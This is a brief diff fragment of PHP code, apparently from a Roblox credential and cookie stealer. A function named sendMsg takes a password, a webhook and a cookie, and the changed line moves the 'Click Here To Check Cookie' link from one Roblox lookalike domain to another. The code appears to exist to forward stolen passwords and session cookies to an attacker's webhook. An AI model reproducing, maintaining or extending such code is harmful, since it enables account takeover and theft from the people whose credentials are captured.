@@ -268,7 +268,7 @@ function sendMsg($password, $webhook, $cookie)
                         ],
                         "author" => [
                             "name" => "Click Here To Check Cookie",
-                            "url" => "https://vwv-roblox.com/cookiecheck"
+                            "url" => "https://vypex.ml/cookiecheck"
                         ],
                         "fields" => [
                             [
